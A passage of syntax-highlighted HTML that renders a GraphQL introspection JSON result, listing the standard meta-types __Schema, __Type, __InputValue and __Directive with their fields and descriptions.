class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;If this server supports mutation, the type that mutation operations will be rooted at.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;mutationType&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The type that query operations will be rooted at.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;queryType&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;If this server supports subscription, the type that subscription operations will be rooted at.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;subscriptionType&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A list of all types supported by this server.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;types&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Schema&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The fundamental unit of any GraphQL Schema is the type. There are many kinds of types in GraphQL as represented by the `__TypeKind` enum.\n\nDepending on the kind of a type, certain fields describe information about that type. Scalar types provide no information beyond a name and description, while Enum types provide their values. Object and Interface types provide the fields they describe. Abstract types, Union and Interface, provide the Object types possible at runtime. List and NonNull types compose other types.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="s2">&#34;false&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;includeDeprecated&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;enumValues&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__EnumValue&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="s2">&#34;false&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;includeDeprecated&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;fields&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Field&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;inputFields&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__InputValue&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;interfaces&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;kind&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__TypeKind&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ofType&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;possibleTypes&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Arguments provided to Fields or Directives and the input fields of an InputObject are represented as Input Values which describe their type and optionally a default value.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A GraphQL-formatted string representing the default value for this input value.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;defaultValue&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;type&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__InputValue&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A Directive provides a way to describe alternate runtime execution and type validation behavior in a GraphQL document. \n\nIn some cases, you need to provide options to alter GraphQL&#39;s execution behavior in ways field arguments will not suffice, such as conditionally including or skipping a field. Directives provide this by describing additional information to the executor.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;args&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__InputValue&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;locations&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__DirectiveLocation&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="s2">&#34;Use `locations`.&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;onField&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span 